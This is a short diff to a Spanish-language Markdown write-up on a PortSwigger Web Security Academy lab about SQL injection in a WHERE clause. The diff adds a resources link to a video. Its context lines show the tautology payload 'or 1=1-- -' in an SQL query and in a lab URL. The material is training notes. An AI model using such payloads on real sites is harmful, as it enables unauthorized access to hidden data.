@@ -93,6 +93,10 @@ select id,username from users where subscription = '1' or 1 = 1;-- - and id = 5 
 https://0a83007b03adf85d811702c2004f0064.web-security-academy.net/filter?category=Lifestyle'or 1=1-- -
 ````
 
+## Recursos
+
+- [SQLi - #1 SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://www.youtube.com/watch?v=_rCg_-gsQOA)
+
 ![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/2d654adb-8e7f-41eb-b8fc-84c9935c3e83)
 
 
